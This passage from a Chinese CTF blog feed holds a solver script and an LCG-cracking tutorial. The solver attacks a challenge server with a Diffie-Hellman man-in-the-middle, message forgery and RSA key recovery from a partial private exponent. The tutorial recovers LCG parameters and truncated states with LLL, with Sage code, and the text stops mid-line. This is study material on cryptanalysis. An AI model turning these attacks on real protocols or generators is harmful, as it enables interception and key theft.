class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">217534615279223294476101434763509239207</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">state = <span class="literal">False</span></span><br><span class="line"><span class="comment"># global N_factor</span></span><br><span class="line">q = <span class="literal">None</span></span><br><span class="line">io = remote(<span class="string">"121.40.247.133"</span>, <span class="string">"28419"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adapt_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> message.ljust(<span class="number">16</span> - len(message) % <span class="number">16</span> + len(message), <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_flag</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"encrypted flag: b'"</span>)</span><br><span class="line">    encrypted_flag = b64decode(io.recvuntil(<span class="string">"'"</span>))</span><br><span class="line">    print(<span class="string">"Enc_flag:"</span>, encrypted_flag)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_RSA_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"e = "</span>)</span><br><span class="line">    e = int(io.recvline())</span><br><span class="line">    print(<span class="string">"e:"</span>, str(e))</span><br><span class="line">    io.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    n = int(io.recvline())</span><br><span class="line">    print(<span class="string">"n:"</span>, str(n))</span><br><span class="line">    io.recvuntil(<span class="string">"partial d: "</span>)</span><br><span class="line">    d0 = int(io.recvline()) <span class="comment">#low 1050bits</span></span><br><span class="line">    print(<span class="string">"d0:"</span>, str(d0))</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (e, n, d0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_connect</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting [++++++++++++++++]"</span>)</span><br><span class="line">    gamma = <span class="number">1551</span></span><br><span class="line">    keyG = pow(g, gamma, p)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    keyA = int(io.recvline())</span><br><span class="line">    print(keyA)</span><br><span class="line">    io.sendlineafter(<span class="string">"A: "</span>, str(keyG))</span><br><span class="line">    io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">    keyB = int(io.recvline())</span><br><span class="line">    io.sendlineafter(<span class="string">"B: "</span>, str(keyG))</span><br><span class="line">    keyC = pow(keyB, gamma, p) <span class="comment">#BG通信</span></span><br><span class="line">    keyS = pow(keyA, gamma, p) <span class="comment">#AG通信</span></span><br><span class="line">    keyC = long_to_bytes(keyC).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    keyS = long_to_bytes(keyS).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipherC = AES.new(keyC, AES.MODE_ECB)</span><br><span class="line">    cipherS = AES.new(keyS, AES.MODE_ECB)</span><br><span class="line">    print(<span class="string">"keyC:"</span>, keyC)</span><br><span class="line">    print(<span class="string">"keyS:"</span>, keyS)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (cipherC, cipherS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_conversation</span><span class="params">(cipherC, cipherS)</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">        messageA = io.recvline().strip()</span><br><span class="line">        messageA = long_to_bytes(int(messageA, <span class="number">16</span>))</span><br><span class="line">        messageA = cipherS.decrypt(messageA.rjust((<span class="number">16</span> - len(messageA) % <span class="number">16</span>) % <span class="number">16</span> + len(messageA), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"A:"</span>, messageA)</span><br><span class="line">        randnum_begin = messageA.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageA.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageA[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        new_messageA = messageA[:randnum_begin] + randnum</span><br><span class="line">        new_messageA = adapt_message(new_messageA)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageA)</span><br><span class="line">        s = cipherC.encrypt(new_messageA)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"A: "</span>, s)</span><br><span class="line">        io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">        messageB = io.recvline().strip()</span><br><span class="line">        messageB = long_to_bytes(int(messageB, <span class="number">16</span>))</span><br><span class="line">        messageB = cipherC.decrypt(messageB.rjust((<span class="number">16</span> - len(messageB) % <span class="number">16</span>) % <span class="number">16</span> + len(messageB), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"B:"</span>, messageB)</span><br><span class="line">        randnum_begin = messageB.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageB.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageB[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            new_messageB = <span class="string">b'I want to get my AES-key.\ntimestamp:'</span> + randnum</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_messageB = messageB[:randnum_begin] + randnum</span><br><span class="line">        new_messageB = adapt_message(new_messageB)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageB)</span><br><span class="line">        s = cipherS.encrypt(new_messageB)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"B: "</span>, s)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    res = io.recvline().strip()</span><br><span class="line">    res = long_to_bytes(int(res, <span class="number">16</span>))</span><br><span class="line">    res = cipherS.decrypt(res.rjust((<span class="number">16</span> - len(res) % <span class="number">16</span>) % <span class="number">16</span> + len(res), <span class="string">b'\x00'</span>))</span><br><span class="line">    print(res)</span><br><span class="line">    enc_begin = res.find(<span class="string">b'key: '</span>) + <span class="number">5</span></span><br><span class="line">    enc_end = res.find(<span class="string">b'\ntimestamp'</span>)</span><br><span class="line">    enc = res[enc_begin:enc_end]</span><br><span class="line">    print(<span class="string">'enc:'</span>, enc)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation completed [++++++++++++++++]"</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(<span class="number">1400</span>-kbits), beta=<span class="number">0.65</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">if</span> ZZ(p):</span><br><span class="line">            q = int(p)</span><br><span class="line">            state = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/&#123;&#125;"</span>.format(k, e), end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> p0 &gt; <span class="number">1</span> <span class="keyword">and</span> n % p0 == <span class="number">0</span>:</span><br><span class="line">                q = int(p0)</span><br><span class="line">                state = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            daemon_thread = threading.Thread(target=partial_p, args=(p0,kbits,n,), daemon=<span class="literal">True</span>)</span><br><span class="line">            daemon_thread.start()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    encrypted_flag = get_encrypted_flag()</span><br><span class="line">    (e, n, d0) = gen_RSA_key()</span><br><span class="line">    (cipherC, cipherS) = MITM_connect()</span><br><span class="line">    c = MITM_conversation(cipherC, cipherS)</span><br><span class="line">    print(<span class="string">"RSA_enc_key:"</span>, c)</span><br><span class="line">    d0 = Integer(d0)</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    find_p(d0, kbits, e, n)</span><br><span class="line">    p = n // q</span><br><span class="line">    d = inverse(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    print(<span class="string">"[+] d = &#123;&#125;"</span>.format(d))</span><br><span class="line">    key = long_to_bytes(pow(c, d, n))</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    print(aes.decrypt(encrypted_flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>$size(e)=10$，也可能是虚拟机里跑sage不太可，脚本跑的时间看人品-.-</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(PRNG)</title>
      <link href="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/"/>
      <url>/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/</url>
      
        <content type="html"><![CDATA[<h3 id="LCG-Basis"><a href="#LCG-Basis" class="headerlink" title="LCG - Basis"></a>LCG - Basis</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><p>[前置知识]</p><p>$S_{n+1}\equiv aS_{n}+b(mod\ m)$，$S_{0}$为对应种子.</p><p>在$F_{m}$上（m取大素数），若$gcd(a,m)=1$，则周期$T=ord_{m}(a)$.</p><p>所以选取系数时应尽量使得a为模m的原根，以此尽量延长LCG周期，同时也要避免$S_{0}=S_{bad}$.</p><h3 id="LCG-Unknown-a-b"><a href="#LCG-Unknown-a-b" class="headerlink" title="LCG - Unknown (a, b)"></a>LCG - Unknown (a, b)</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>$S_{n+1}\equiv aS_{n}+b(mod\ m)$，(a, b)未知，m已知.</p><p>则只要给出连续三个生成值$s_{0},s_{1},s_{2}$即可求解（等价于给出两个$F_{m}$上的模方程）</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-12-02.png" alt></p><p>虽然求解上述方程组很容易，但这里介绍一组求模等式方程组的通法.</p><p>该方法基于LLL，对构造的格基进行约化.</p><p>e.g. 对上述方程组构造如下矩阵：</p><p><img src= "/img/loading.gif" data-src="/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/Snipaste_2020-03-30_22-30-12.png" alt></p><p>我们希望格基约化后能得到一个行向量，满足前两个元素为0.</p><p>且为了在约化后的矩阵中得到直观的a, b，邻接上一个$\frac{E}{m}$（这里不用单位矩阵E的原因，是因为最好使得包含a(-a),b(-b)的行向量的长度尽可能短，也就是说更大的分母也是允许的）.</p><p>在LLL约化后，只要找到满足下列要求的行向量r，即求解成功：</p><ul><li>r[0] = r[1] = 0</li><li>r[-1] = 1(-1)</li></ul><p>$\rightarrow m\cdot r[2]=a(-a),m\cdot r[3]=b(-b)$. </p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix([</span><br><span class="line">    [s0  ,s1  ,<span class="number">1</span>/m ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">1</span>   ,<span class="number">1</span>   ,<span class="number">0</span>   ,<span class="number">1</span>/m ,<span class="number">0</span>   ],</span><br><span class="line">    [-s1 ,-s2 ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">1</span>   ],</span><br><span class="line">    [m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ],</span><br><span class="line">    [<span class="number">0</span>   ,m   ,<span class="number">0</span>   ,<span class="number">0</span>   ,<span class="number">0</span>   ]</span><br><span class="line">])</span><br><span class="line">A = A.LLL()</span><br><span class="line">a = <span class="literal">None</span></span><br><span class="line">b = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">if</span> l[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> l[<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> l[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            a, b = l[<span class="number">2</span>] * m, l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">elif</span> l[<span class="number">-1</span>] == <span class="number">-1</span>:</span><br><span class="line">            a, b = -l[<span class="number">2</span>] * m, -l[<span class="number">3</span>] * m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> a <span class="keyword">or</span> <span class="keyword">not</span> b:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"[*] No solves"</span>)</span><br><span class="line">a %= m</span><br><span class="line">b %= m</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>构造矩阵进行LLL约化是在解决模等式和CVP等问题时很实用的方法，应熟练掌握.</p><h3 id="LCG-Unknown-a-b-m"><a href="#LCG-Unknown-a-b-m" class="headerlink" title="LCG - Unknown (a, b, m)"></a>LCG - Unknown (a, b, m)</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p>在乘数，增量和模数均未知时，对任意N，由取得的连续N个数据构成的N个模方程均有N+3个未知元. 因此不能以上述方法求解，因此用下述方法进行Module_crack.</p><p>假设我们有一组数据data = $\{k_{i}N\}$(N为大素数，$k_{i}$为$F_{N}$下的随机数)，则reduce(GCD, data)很大概率即为N或N乘上一些很小的因子.（$\because$ 假设len(data)=n，则在$k_{i}$视作完全随机的情况下，reduce(GCD, data)有除N外的素因子p的概率约为$\frac{1}{p^{n}}$，$\therefore$ 在p或n足够大的时候该方法能有效求解N）</p><p>引入序列$T_{n}=S_{n+1}-S_{n}$</p><p>$T_{n+1}=S_{n+2}-S_{n+1}=a(S_{n+1}-S_{n})=aT_{n}(mod\ m)$</p><p>$T_{n+2}=S_{n+3}-S_{n+2}=a(S_{n+2}-S_{n+1})=aT_{n+1}=a^{2}T_{n}(mod\ m)$</p><p>$\therefore T_{n}T_{n+2}-T_{n+1}^{2}=0(mod\ m)$</p><p>因此只要我们能拿到连续$n(n\geq 6)$组数据，即可对module进行有效攻击. 后续即转为上一个情形的LCG攻击. </p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        m = getPrime(<span class="number">256</span>)</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        b = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        seed = getRandomRange(<span class="number">2</span>, m)</span><br><span class="line">        self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">        self._state = seed</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line">        <span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._key</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">delta = [d1 - d0 <span class="keyword">for</span> (d0, d1) <span class="keyword">in</span> zip(data, data[<span class="number">1</span>:])]</span><br><span class="line">m_mul = [d0 * d2 - d1 * d1 <span class="keyword">for</span> (d0, d1, d2) <span class="keyword">in</span> zip(delta, delta[<span class="number">1</span>:], delta[<span class="number">2</span>:])]</span><br><span class="line">m = reduce(GCD, m_mul)</span><br><span class="line">factors = factor(m)</span><br><span class="line"><span class="keyword">if</span> len(factors) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> (prime, degree) <span class="keyword">in</span> factors:</span><br><span class="line">        <span class="keyword">if</span> size(prime) == <span class="number">256</span>:</span><br><span class="line">            m = prime</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        m //= (prime**degree)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jump to Unknown (a, b) case</span></span><br></pre></td></tr></table></figure><h4 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h4><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/" target="_blank" rel="noopener">https://tailcall.net/blog/cracking-randomness-lcgs/</a></p><h3 id="LCG-Truncated-Given-a-b-m"><a href="#LCG-Truncated-Given-a-b-m" class="headerlink" title="LCG - Truncated (Given a, b, m)"></a>LCG - Truncated (Given a, b, m)</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p>Truncated LCG可以表示如下:</p><p>$x_{i}=2^{\beta\cdot size(m)}y_{i}+z_{i}$，$\beta$为discarded bits的比例因子，使用的随机数流仅为$y_{i}s$，在给出部分连续$y_{i}$和(a, b, m)的情况下，我们能有效恢复出$z_{i}$，从而预测接下来的随机数流.</p><p>首先讨论一类求解模等式组的问题，可以表示为</p><script type="math/tex; mode=display">\sum^{k}_{j=1}a_{ij}x_{j}=c_{i}(mod\ M),i\in\{1,...,k\}</script><p>如果此时我们对系数矩阵A进行格基约化，即AL=LLL(A)，则</p><script type="math/tex; mode=display">\sum^{k}_{j=1}a'_{ij}x_{j}=c'_{i}(mod\ M)\\C'=A.solve\_left(AL)\cdot C</script><p>因为AL为约简基，所以也同时有效减小$k_{i}(Mk_{i}+c_{i}=\sum^{k}_{j=1}a_{ij}x_{j})$.（约化后可视作$k\rightarrow k_{min}$）</p><p>令$delta_X=[x_{1}-x_{0},x_{2}-x_{1},…,x_{n}-x_{n-1}]^{T}$</p><p>$delta_Y=[2^{\beta\cdot size(m)}(y_{1}-y_{0}),2^{\beta\cdot size(m)}(y_{2}-y_{1}),…,2^{\beta\cdot size(m)}(y_{n}-y_{n-1})]^{T}$</p><p>$delta_Z=[z_{1}-z_{0},z_{2}-z_{1},…,z_{n}-z_{n-1}]$</p><p>$\because x_{i+1}-x_{i}=a^{i}(x_{1}-x_{0})\quad(mod\ m)$</p><p>$\therefore$ 构造矩阵A如下</p><script type="math/tex; mode=display">\left[\begin{matrix}m & 0 & 0 & ... & 0\\a & -1 & 0 & ... & 0\\a^{2} & 0 & -1 & ... & 0\\... & ... & ... & ... & ...\\a^{n} & 0 & 0 & ... & -1\end{matrix}\right]</script><p>$A\cdot delta_X=0(mod\ m),AL=LLL(A)$</p><p>$AL\cdot delta_X=0(mod\ m),AL\cdot delta_X=m\cdot [k_{0},…,k_{n-1}]^{T}$</p><p>$AL\cdot(delta_Y+delta_Z)=m\cdot [k_{0},…,k_{n-1}]^{T}$</p><p>则此时满足：$k\rightarrow k_{min}$，因为delta_Z未知，我们只能利用delta_Y进行估值，可以做个粗略估计</p><p>AL中每个元大小近似取作$det(AL)^{\frac{1}{n}}=m^{\frac{1}{n}}$，而$size(delta_Z[i])\leq\beta\cdot size(m)$，因此</p><p>$nm^{\frac{1}{n}}2^{\beta\cdot size(m)}&lt;m\Rightarrow$ 在m足够大时，n可忽略不计（一般取10即可），即$\beta&lt;\frac{n-1}{n}$</p><p>在上述条件满足时，可视作$AL\cdot delta_Z&lt;|m|$（但只是大致估计）</p><p>因此$k_{i}=round((AL\cdot delta_Y)_{i}/m)$，求得$k_{i}$后，$delta_Z=AL.solve_right(mk-AL\cdot delta_Y)$，delta_X获知，即可推出种子破解整个truncated LCG.</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prng = LCG(<span class="number">128</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    data.append(prng.next())</span><br><span class="line">leak_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    leak_data.append(data[i] - data[i] % <span class="number">2</span>^<span class="number">48</span>)</span><br><span class="line">print(prng.export_key())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed, a, b, m)</span>:</span></span><br><span class="line">    x = seed % m</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (a * x + b) % m</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[51]:</span></span><br><span class="line">a = <span class="number">94105412428421315937226606524092193902</span></span><br><span class="line">b = <span class="number">272271222013811783094314393442542793059</span></span><br><span class="line">m = <span class="number">335812331024081385414724338959789210621</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">A[<span class="number">0</span>, <span class="number">0</span>] = m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    A[i, <span class="number">0</span>] = a^i</span><br><span class="line">    A[i, i] = <span class="number">-1</span></span><br><span class="line">AL = A.LLL()</span><br><span class="line">delta_Y = vector([leak_data[i + <span class="number">1</span>] - leak_data[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span 